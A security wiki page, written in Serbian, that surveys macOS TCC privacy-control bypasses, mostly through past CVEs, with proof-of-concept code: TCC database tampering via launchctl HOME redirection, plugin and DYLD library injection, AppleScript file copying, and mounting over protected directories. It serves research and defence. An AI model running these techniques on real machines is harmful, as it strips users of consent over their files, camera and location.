# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## Prema funkcionalnosti

### Write Bypass

Ovo nije bypass, već samo način na koji TCC funkcioniše: **ne štiti od upisivanja**. Ako **Terminal nema pristup čitanju Desktop-a korisnika, i dalje može da upisuje u njega**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
**Prošireni atribut `com.apple.macl`** dodaje se novoj **datoteci** kako bi **creators app** dobila pristup čitanju.

### TCC ClickJacking

Moguće je **postaviti prozor preko TCC prompta** kako bi korisnik **prihvatio** zahtev, a da to ne primeti. PoC možete pronaći u [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Napadač može **kreirati aplikacije sa bilo kojim imenom** (npr. Finder, Google Chrome...) u **`Info.plist`** datoteci i podesiti ih da zahtevaju pristup nekoj TCC zaštićenoj lokaciji. Korisnik će misliti da je legitimna aplikacija ta koja zahteva ovaj pristup.\
Pored toga, moguće je **ukloniti legitimnu aplikaciju iz Dock-a i postaviti lažnu na njeno mesto**, tako da, kada korisnik klikne na lažnu aplikaciju (koja može koristiti istu ikonu), ona može pozvati legitimnu aplikaciju, zatražiti TCC dozvole i izvršiti malware, navodeći korisnika da poveruje da je legitimna aplikacija zatražila pristup.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Više informacija i PoC:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Podrazumevano, pristup preko **SSH-a je imao "Full Disk Access"**. Da biste ovo onemogućili, potrebno je da bude naveden, ali onemogućen (uklanjanje sa liste neće ukloniti te privilegije):<sup>[2]</sup>

![TCC Request by arbitrary name - SSH Bypass: Podrazumevano, pristup preko SSH-a je imao "Full Disk Access". Da biste ovo onemogućili, potrebno je da bude naveden, ali onemogućen (uklanjanje...](<../../../../../images/image (1077).png>)

Ovde možete pronaći primere kako su neki **malware-i uspeli da zaobiđu ovu zaštitu**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[11]</sup>

> [!CAUTION]
> Imajte na umu da je sada, kako biste mogli da omogućite SSH, potreban **Full Disk Access**

### Handle extensions - CVE-2022-26767

Atribut **`com.apple.macl`** dodeljuje se datotekama kako bi **određenoj aplikaciji dao dozvole za čitanje te datoteke.** Ovaj atribut se postavlja kada se datoteka **prevuče i otpusti** preko aplikacije ili kada korisnik **dvaput klikne** na datoteku kako bi je otvorio pomoću **podrazumevane aplikacije**.

Zato bi korisnik mogao da **registruje zlonamernu aplikaciju** za rukovanje svim ekstenzijama i pozove Launch Services da **otvori** bilo koju datoteku (čime će zlonamernoj datoteci biti odobren pristup čitanju).

### iCloud

Pomoću entitlement-a **`com.apple.private.icloud-account-access`** moguće je komunicirati sa **`com.apple.iCloudHelper`** XPC servisom, koji će **obezbediti iCloud tokene**.

**iMovie** i **Garageband** su imali ovaj entitlement i druge entitlements koji su to omogućavali.

Za više **informacija** o exploitu za **dobavljanje icloud tokena** pomoću tog entitlement-a pogledajte predavanje: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[12]</sup>

### kTCCServiceAppleEvents / Automation

Aplikacija sa dozvolom **`kTCCServiceAppleEvents`** moći će da **kontroliše druge aplikacije**. To znači da bi mogla da **zloupotrebi dozvole dodeljene drugim aplikacijama**.

Za više informacija o Apple Scripts pogledajte:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Na primer, ako aplikacija ima **Automation dozvolu nad `iTerm`**, kao u ovom primeru, **`Terminal`** ima pristup aplikaciji iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

Terminal, koji nema FDA, može da pozove iTerm, koji ga ima, i da ga koristi za izvršavanje radnji:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Preko Finder-a

Ili, ako App ima pristup preko Finder-a, može da izvrši skriptu kao što je ova:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Prema ponašanju aplikacije

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Userland **tccd daemon** je koristio **`HOME`** **env** promenljivu za pristup TCC users bazi podataka na lokaciji: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Prema [ovoj Stack Exchange objavi](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) i pošto se TCC daemon pokreće putem **`launchd`** unutar domena trenutnog korisnika, moguće je **kontrolisati sve environment promenljive** koje mu se prosleđuju.\
Prema tome, **attacker bi mogao da podesi `$HOME` environment** promenljivu u **`launchctl`** tako da pokazuje na **kontrolisani** **direktorijum**, da restartuje **TCC** daemon i zatim **direktno izmeni TCC bazu podataka** kako bi sebi dodelio **svaki dostupni TCC entitlement**, a da se krajnjem korisniku nikada ne prikaže upit.<sup>[1]</sup>\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes je imao pristup lokacijama zaštićenim pomoću TCC-a, ali kada se napravi beleška, ona se **kreira na nezaštićenoj lokaciji**. Zato je bilo moguće zatražiti od aplikacije Notes da kopira zaštićeni fajl u belešku (odnosno na nezaštićenu lokaciju), a zatim pristupiti tom fajlu:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Binarni fajl `/usr/libexec/lsd` sa bibliotekom `libsecurity_translocate` imao je entitlement `com.apple.private.nullfs_allow`, koji mu je omogućavao da kreira **nullfs** mount, kao i entitlement `com.apple.private.tcc.allow` sa **`kTCCServiceSystemPolicyAllFiles`**, za pristup svakom fajlu.

Bilo je moguće dodati quarantine atribut biblioteci "Library", pozvati **`com.apple.security.translocation`** XPC service, nakon čega bi Library bila mapirana na **`$TMPDIR/AppTranslocation/d/d/Library`**, gde je svim dokumentima unutar Library bilo moguće **pristupiti**.

### CVE-2024-44131 - FileProvider symlink race

Aplikacije koje prosleđuju operacije nad fajlovima **privileged helper** procesu (ovde **`fileproviderd`** / **`Files.app`**) kopiraju ili premeštaju stavke **u ime korisnika**, pa se kopiranje izvršava sa privilegijama helper-a umesto sa privilegijama pozivaoca.

Jamf Threat Labs je pokazao da provera symlink-a koja se izvršava pre operacije može biti predmet **race** uslova: umesto postavljanja symlink-a na **poslednju** komponentu putanje (koja se proverava), napadač menja **posredni** direktorijum putanje **nakon što je kopiranje već počelo**. Privileged helper zatim prati link pod kontrolom napadača i čita/upisuje lokacije zaštićene pomoću TCC-a **bez ikakvog prikazivanja prompt-a**.<sup>[7]</sup>

Direktorijumi koji u svojoj putanji **nisu** zaštićeni nasumičnim UUID-om (na primer `~/Library/Mobile Documents/com~apple~CloudDocs`) najlakše su mete, zato što napadač može da predvidi punu putanju za race.

> [!TIP]
> Ovo je generički obrazac koji treba tražiti: **svaki privilegovani proces koji više puta razrešava putanju** (check-then-use ili `rename()`/`copyfile()` koji zasebno razrešavaju izvor i odredište) može biti napadnut zamenom direktorijuma u sredini putanje. Samo `O_NOFOLLOW_ANY`, `openat()` nad već otvorenim direktorijumom FD ili `realpath()` + ponovna validacija zaista zatvaraju ovaj vremenski prozor.

Više informacija nalazi se u [**izveštaju Jamf Threat Labs**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[7]</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` može biti build-ovan sa `SQLITE_ENABLE_SQLLOG`, što dodaje logging hook kojim upravljaju environment variables ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[8]</sup>

- **`SQLITE_SQLLOG_DIR=path`** – za **svaku bazu podataka koja se otvori**, **kopija fajla baze podataka** i log SQL iskaza upisuju se u `path` (direktorijum mora već da postoji).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – pravi **novu kopiju svaki put** kada se DB otvori/prikači, umesto ponovne upotrebe postojeće.
- **`SQLITE_SQLLOG_CONDITIONAL`** – loguje konekciju samo ako pored glavne DB postoji fajl `<database>-sqllog`.

Ako možete da ubacite ovu promenljivu u proces koji ima **FDA** i otvara SQLite baze podataka, on će bez problema **kopirati te zaštićene baze podataka** u direktorijum koji kontrolišete. Pošto se naziv odredišnog fajla izvodi iz podataka pod kontrolom napadača, **symlink postavljen na odredištu** pretvara isti primitive u **upis proizvoljnog fajla** sa privilegijama ciljnog procesa.

### **SQLITE_AUTO_TRACE**

Ako je environment variable **`SQLITE_AUTO_TRACE`** postavljen, biblioteka **`libsqlite3.dylib`** će početi da **loguje** sve SQL upite. Mnoge aplikacije su koristile ovu biblioteku, pa je bilo moguće logovati sve njihove SQLite upite.

Nekoliko Apple aplikacija koristilo je ovu biblioteku za pristup informacijama zaštićenim pomoću TCC-a.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### Potraga za upisima u fajlove pokrenutim env-var promenljivama

Prethodna dva primera su instance iste generičke tehnike i vredi potražiti još takvih slučajeva: **frameworks učitani u TCC-privileged aplikacije često izlažu debug/logging environment promenljive koje uzrokuju da proces kreira fajl na putanji koju kontroliše pozivalac**.

Workflow za njihovo pronalaženje:

1. Izaberite target sa FDA ili drugom korisnom TCC dozvolom (`Music`, `TV`, `Terminal`, MDM agents...) i izlistajte frameworks koje povezuje (`otool -L`, `vmmap`).
2. Pretražite te frameworks za `getenv` stringove: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Postavite kandidat promenljive putem `launchctl setenv NAME /path/you/control`, pokrenite aplikaciju i pratite šta radi na filesystemu pomoću `fs_usage -w -f filesys <pid>` ili `sudo fs_usage | grep <path>`.
4. Ako proces **kreira ili preimenuje** fajl u vašem direktorijumu, imate write primitive: usmerite destinaciju na symlink (ili napravite race sa međudirektorijumom, kao u prethodnom CVE-2024-44131) da biste ga preusmerili na `~/Library/Application Support/com.apple.TCC/TCC.db`.

> [!TIP]
> Dve stvari ovo ograničavaju. Prvo, **`DYLD_*` promenljive se ignorišu za hardened-runtime binaries** osim ako aplikacija ne uključuje entitlement [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) ("a Boolean value that indicates whether the app may be affected by dynamic linker environment variables, which you can use to inject code into your app's process") — pogledajte i [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). Drugo, Apple uklanja pojedinačne framework debug promenljive čim budu prijavljene, pa promenljiva koja je radila na jednom macOS izdanju često nestane u sledećem. Ako aplikacija nakon postavljanja neke promenljive nečujno odbija da se pokrene, tretirajte tu promenljivu kao već filtriranu.

Pogledajte [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) za ekvivalentni trik sa linker promenljivama.

### Apple Remote Desktop

Kao root mogli biste da omogućite ovaj servis, nakon čega bi **ARD agent imao full disk access**, što bi korisnik zatim mogao da zloupotrebi kako bi naterao servis da kopira novu **TCC user bazu**.

## Putem **NFSHomeDirectory**

TCC koristi bazu u korisničkom HOME folderu za kontrolu pristupa resursima specifičnim za korisnika na putanji **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Zato, ako korisnik uspe da restartuje TCC sa $HOME env promenljivom koja pokazuje na **drugi folder**, mogao bi da kreira novu TCC bazu u **/Library/Application Support/com.apple.TCC/TCC.db** i prevari TCC da dodeli bilo koju TCC dozvolu bilo kojoj aplikaciji.

> [!TIP]
> Imajte na umu da Apple koristi vrednost podešavanja sačuvanu u korisničkom profilu, u atributu **`NFSHomeDirectory`**, kao **vrednost `$HOME`**. Zato, ako kompromitujete aplikaciju koja ima dozvole za izmenu ove vrednosti (**`kTCCServiceSystemPolicySysAdminFiles`**), možete **weaponize** ovu opciju pomoću TCC bypass-a.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**Prvi POC** koristi [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) i [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) za izmenu **HOME** foldera korisnika.

1. Nabavite _csreq_ blob za ciljnu aplikaciju.
2. Postavite lažni _TCC.db_ fajl sa potrebnim pristupom i _csreq_ blobom.
3. Eksportujte Directory Services unos korisnika pomoću [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Izmenite Directory Services unos kako biste promenili home direktorijum korisnika.
5. Importujte izmenjeni Directory Services unos pomoću [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Zaustavite korisnikov _tccd_ i rebootujte proces.

Drugi POC je koristio **`/usr/libexec/configd`**, koji je imao `com.apple.private.tcc.allow` sa vrednošću `kTCCServiceSystemPolicySysAdminFiles`.\
Bilo je moguće pokrenuti **`configd`** sa opcijom **`-t`**, pri čemu je attacker mogao da navede **custom Bundle za učitavanje**. Zato exploit **zamenjuje** metod promene home direktorijuma korisnika pomoću **`dsexport`** i **`dsimport`** sa **`configd` code injection** metodom.

Za više informacija pogledajte [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).<sup>[13]</sup>

## Putem process injection

Postoje različite tehnike za ubacivanje koda u proces i zloupotrebu njegovih TCC privilegija:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Štaviše, najčešći process injection za bypass TCC-a koristi **plugins (load library)**.\
Plugins su dodatni kod, obično u obliku libraries ili plist fajla, koji će biti **učitan od strane glavne aplikacije** i izvršavaće se u njenom kontekstu. Zato, ako je glavna aplikacija imala pristup fajlovima ograničenim TCC-om (putem dodeljenih dozvola ili entitlements), **custom code će ga takođe imati**.

### CVE-2020-27937 - Directory Utility

Aplikacija `/System/Library/CoreServices/Applications/Directory Utility.app` imala je entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, učitavala plugins sa ekstenzijom **`.daplug`** i **nije imala hardened** runtime.

Da bi se ovaj CVE weaponize-ovao, **`NFSHomeDirectory`** se **menja** (zloupotrebom prethodnog entitlement-a), kako bi bilo moguće **preuzeti korisničke TCC baze** i zaobići TCC.

Za više informacija pogledajte [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).<sup>[14]</sup>

### CVE-2020-29621 - Coreaudiod

Binary **`/usr/sbin/coreaudiod`** imao je entitlements `com.apple.security.cs.disable-library-validation` i `com.apple.private.tcc.manager`. Prvi je **omogućavao code injection**, a drugi mu je davao pristup za **upravljanje TCC-om**.

Ovaj binary je omogućavao učitavanje **third party plug-ins** iz foldera `/Library/Audio/Plug-Ins/HAL`. Zato je bilo moguće **učitati plugin i zloupotrebiti TCC dozvole** pomoću ovog POC-a:<sup>[15]</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Za više informacija pogledajte [**originalni izveštaj**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).<sup>[15]</sup>

### Device Abstraction Layer (DAL) Plug-Ins

System aplikacije koje otvaraju stream kamere putem Core Media I/O (aplikacije sa **`kTCCServiceCamera`**) učitavaju ove pluginove u procesu, koji se nalaze u `/Library/CoreMediaIO/Plug-Ins/DAL` (nisu ograničeni SIP-om).

Dovoljno je samo sačuvati biblioteku sa uobičajenim **constructor**-om na toj lokaciji da bi se omogućio **inject code**.

Nekoliko Apple aplikacija bilo je ranjivo na ovo.

### Firefox

Firefox aplikacija imala je entitlements `com.apple.security.cs.disable-library-validation` i `com.apple.security.cs.allow-dyld-environment-variables`:<sup>[16]</sup>
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Za više informacija o tome kako ovo lako exploitovati, [**pogledajte originalni izveštaj**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[16]</sup>

### CVE-2020-10006

Binarni fajl `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` imao je entitlements **`com.apple.private.tcc.allow`** i **`com.apple.security.get-task-allow`**, što je omogućavalo injectovanje koda unutar procesa i korišćenje TCC privilegija.

### CVE-2023-26818 - Telegram

Telegram je imao entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** i **`com.apple.security.cs.disable-library-validation`**, pa je bilo moguće zloupotrebiti ga za **dobijanje pristupa njegovim dozvolama**, kao što je snimanje kamerom. [**Payload možete pronaći u writeup-u**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[17]</sup>

Obratite pažnju na to da je, za korišćenje env variable za učitavanje library-ja, kreiran **custom plist** za injectovanje ove library, a **`launchctl`** je korišćen za njeno pokretanje:<sup>[17]</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Putem open invocations

Moguće je pozvati **`open`** čak i kada ste u sandboxu.

### Terminal Scripts

Prilično je uobičajeno dodeliti terminalu **Full Disk Access (FDA)**, barem na računarima koje koriste tehnički korisnici. Takođe je moguće pomoću njega pozivati **`.terminal`** skripte.

**`.terminal`** skripte su plist datoteke poput ove, sa komandom koja se izvršava u ključu **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Aplikacija bi mogla da upiše terminal script na lokaciju kao što je /tmp i pokrene ga komandom kao što je:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Montiranjem

### CVE-2020-9771 - mount_apfs TCC bypass i eskalacija privilegija

**Bilo koji korisnik** (čak i korisnici bez privilegija) može da kreira i montira time machine snapshot i **pristupi SVIM datotekama** tog snapshot-a.\
**Jedina potrebna privilegija** jeste da aplikacija koja se koristi (kao što je `Terminal`) ima **Full Disk Access** (FDA) pristup (`kTCCServiceSystemPolicyAllfiles`), koji mora da odobri administrator.<sup>[2]</sup>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Detaljnije objašnjenje može se [**naći u originalnom izveštaju**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Montiranje preko TCC datoteke

Čak i ako je TCC DB datoteka zaštićena, bilo je moguće **montirati novu TCC.db datoteku preko direktorijuma**:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Proverite **ceo exploit** u [**originalnom writeup-u**](https://theevilbit.github.io/posts/cve-2021-30808/).

### CVE-2024-40855

Kao što je objašnjeno u [originalnom writeup-u](https://www.kandji.io/blog/macos-audit-story-part2), ovaj CVE je zloupotrebljavao `diskarbitrationd`.<sup>[18]</sup>

Funkcija `DADiskMountWithArgumentsCommon` iz javnog `DiskArbitration` framework-a obavljala je bezbednosne provere. Međutim, moguće je zaobići je direktnim pozivanjem `diskarbitrationd` i samim tim koristiti elemente `../` u putanji i symlink-ove.

To je napadaču omogućilo proizvoljno mount-ovanje na bilo kojoj lokaciji, uključujući i mount-ovanje preko TCC baze podataka, zbog entitlement-a `com.apple.private.security.storage-exempt.heritable` procesa `diskarbitrationd`.

### asr

Alat **`/usr/sbin/asr`** omogućavao je kopiranje celog diska i njegovo mount-ovanje na drugoj lokaciji, zaobilazeći TCC zaštite.

### CVE-2022-22655 - Location Services

Location Services se **ne čuvaju** u TCC bazi podataka kao ostali servisi. Njima upravlja `locationd`, koji svoju listu dozvoljenih klijenata čuva u **`/var/db/locationd/clients.plist`**:<sup>[5]</sup>
```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```
Svaki unos je označen klijentom (bundle ID ili putanja do izvršne datoteke) i sadrži polja kao što su `Authorized`, `BundleId`, `Executable` i `Registered`.

Sama datoteka `clients.plist` zaštićena je mehanizmima Sandbox/TCC i ne može se izmeniti čak ni sa root privilegijama — ali **direktorijum `/var/db/locationd/` nije bio zaštićen od mountovanja**. Zato je napadač koji radi kao root mogao da napravi disk image koji sadrži njegovu `clients.plist` datoteku (sa svojim binarnim fajlom označenim kao `Authorized`), mountuje ga preko tog direktorijuma i restartuje `locationd`, čime bi falsifikovana allow-lista stupila na snagu.<sup>[5]</sup>

> [!TIP]
> Ovo je isti obrazac kao kod `hdiutil`/`mount` TCC bypassa iznad: *datoteka* je zaštićena, dok *direktorijum u kom se nalazi* nije, pa se umesto datoteke zamenjuje ceo direktorijum.

## Preko startup aplikacija


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Preko grep-a

U nekoliko slučajeva datoteke čuvaju osetljive informacije, kao što su email adrese, brojevi telefona, poruke... na nezaštićenim lokacijama (što se kod Apple-a smatra ranjivošću).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Ovo više ne funkcioniše, ali [**ranije je funkcionisalo**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Drugi način je korišćenje [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):<sup>[19]</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Reference

- [1] [CVE-2020–9934: Bypassing the macOS Transparency, Consent, and Control (TCC) Framework](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [Bypassing macOS TCC User Privacy Protections By Accident and Design](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [20+ Ways to Bypass Your macOS Privacy Mechanisms](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [4] [Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [5] [CVE-2022-22655 - TCC Location Services bypass (original report)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [6] [Where in the World is Carmen Sandiego: Abusing Location Services on macOS](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [7] [Jamf Threat Labs - CVE-2024-44131: TCC bypass steals data from iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [8] [SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG env variables)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [9] [Apple - Allow DYLD environment variables entitlement](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [10] [The Eclectic Light Company - Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [11] [Zero-Day TCC bypass discovered in XCSSET malware](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [12] [OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [13] [New macOS vulnerability, "powerdir," could lead to unauthorized user data access](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [14] [Change home directory and bypass TCC aka CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [15] [Play the music and bypass TCC aka CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [16] [How to rob a (Fire)fox](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
